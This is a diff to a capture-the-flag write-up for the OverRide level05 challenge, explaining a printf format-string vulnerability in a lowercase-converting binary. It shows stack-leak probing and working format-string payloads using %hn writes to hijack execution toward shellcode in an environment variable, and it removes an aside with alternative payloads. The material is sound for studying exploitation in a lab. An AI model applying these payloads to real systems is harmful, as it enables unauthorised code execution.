@@ -18,7 +18,6 @@ level05@OverRide:~$ ./level05
 HELLO
 hello
 ```
-
 ## Solution
 
 ### main() overview
@@ -29,7 +28,7 @@ This program is a basic ```tolower()```, which is of little interest to us. <br 
 However we do see a call to ```printf()```, which is vulnerable to string format exploits. <br />
 We also see a call to ```exit()```.
 
-### Build exploit
+### Exploit
 
 Unfortunately, we see the stack is non-executable. We can overflow the buffer, but we can't overwrite the EIP with an address (like ```system("/bin/sh")```) in the stack because it won't execute.
 ```
@@ -96,6 +95,8 @@ level05@OverRide:~$ python -c 'print "AAAA"+" %x"*12' | ./level05
 aaaa 64 f7fcfac0 f7ec3af9 ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 61616161 20782520 25207825
 ```
 
+### Build exploit
+
 Looks good... Let's sum it all up! <br />
 Our attack takes place in 2 steps:
 - malicious environment variable 
@@ -117,16 +118,4 @@ Our attack takes place in 2 steps:
 Let's try it. 
 ```
 (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10189d%11$hn")'; cat) | ./level05
-```
-
-
-ANYA SAYS
-Why we can't just do this (with a %u modifier) is beyond me!
-```(python -c 'print "\xe0\x97\x04\x08" + "%4294957094u" + "%10$n"'; cat) | ./level05```
-
-```(python -c 'print "\xe0\x97\x04\x08" + "%4294957098u" + "%10$n"'; cat) | ./level05```
-
-
-```
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
 ```
